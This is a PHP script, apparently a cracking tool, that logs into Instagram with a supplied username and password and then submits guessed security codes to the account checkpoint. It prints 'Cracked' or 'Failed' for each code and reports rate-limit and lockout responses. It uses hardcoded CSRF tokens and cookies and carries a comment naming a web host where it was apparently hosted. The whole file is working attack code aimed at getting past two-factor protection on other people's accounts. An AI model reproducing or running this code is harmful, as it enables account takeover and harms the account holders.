<?
// http://www.mughniagent.co.uk/instagram/normal.php?mid=[]&user=[]&pass=[]&code=[]
$username2 = $_GET['user'];
$password2 = $_GET['pass'];
$code2 = $_GET['code'];
$ch2 = curl_init(); 
curl_setopt($ch2, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/");
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch2, CURLOPT_HTTPHEADER, array(
    'Host: www.instagram.com',
    'X-CSRFToken: F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1',
    'X-Instagram-AJAX: 1',
    'X-Requested-With: XMLHttpRequest',
    'Referer: https://www.instagram.com/',
    'Cookie: csrftoken=F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1;'
    ));
curl_setopt($ch2, CURLOPT_POSTFIELDS, "username=$username2&password=$password2");
curl_setopt($ch2, CURLOPT_HEADER, 1);
$check2 = curl_exec($ch2);
if(eregi('checkpoint', $check2))
{
$starturl2 = explode('"checkpoint_url": "' , $check2 );
$endurl2 = explode('"' , $starturl2[1] );
$uri2 = $endurl2[0];

$url2 = "https://www.instagram.com$uri2";
$instagram2 = curl_init(); 
curl_setopt($instagram2, CURLOPT_URL, $url2);
curl_setopt($instagram2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($instagram2, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($instagram2, CURLOPT_HTTPHEADER, array(
    'X-CSRFToken: F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1',
    'X-Instagram-AJAX: 1',
    "Referer: $url2",
    "Cookie: mid=WWy-QQAEAAE56m6cNeNkhixRJvwg; csrftoken=F8Q8qKQogom1tedr1z1TeEPfR7aWFGt1;"
    ));
curl_setopt($instagram2, CURLOPT_POSTFIELDS, "security_code=$code2");
curl_setopt($instagram2, CURLOPT_HEADER, 1);
$response2 = curl_exec($instagram2);
if(eregi('"location": "https://www.instagram.com/"', $response2))
	{
		echo "Cracked -> ${code2}";
	}
	else
	{
		if(eregi("Please check the code we sent you and try again.", $response2))
		{
			echo "Failed -> ${code2}";
		}
		else
		{
			if(eregi("This field is required.", $response2))
			{
				echo "MID : WWy-QQAEAAE56m6cNeNkhixRJvwg fail";
			}
			else
			{
				if(eregi("Please wait a few minutes before you try again.", $response2))
				{
					echo "Please wait [Blocked]->${code2}";
				}
				else
				{
					if(eregi("You've entered the code incorrectly too many times.", $response2))
					{
						echo "Blocked Dude :( [${code2}]";
					}
					else
					{
						echo $response2 ;
					}
				}
			}
		}
	}
curl_close($instagram2);
}
else
{
	echo "Where is 2FA Man ???";
}
curl_close($ch2);
?>
